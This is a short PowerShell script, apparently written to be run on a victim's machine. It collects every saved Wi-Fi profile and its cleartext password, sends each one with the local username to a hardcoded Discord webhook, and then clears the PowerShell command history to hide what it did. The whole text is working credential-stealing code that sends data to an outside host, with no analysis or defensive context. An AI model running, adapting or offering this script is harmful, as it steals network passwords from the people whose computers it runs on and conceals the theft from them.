
# ENG
netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
	$discord='https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'

	$Body = @{
		'username' = $env:username + " | " + [string]$wlan
		'content' = [string]$passw
	}
	
	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
	
}

# Clear the PowerShell command history
Clear-History
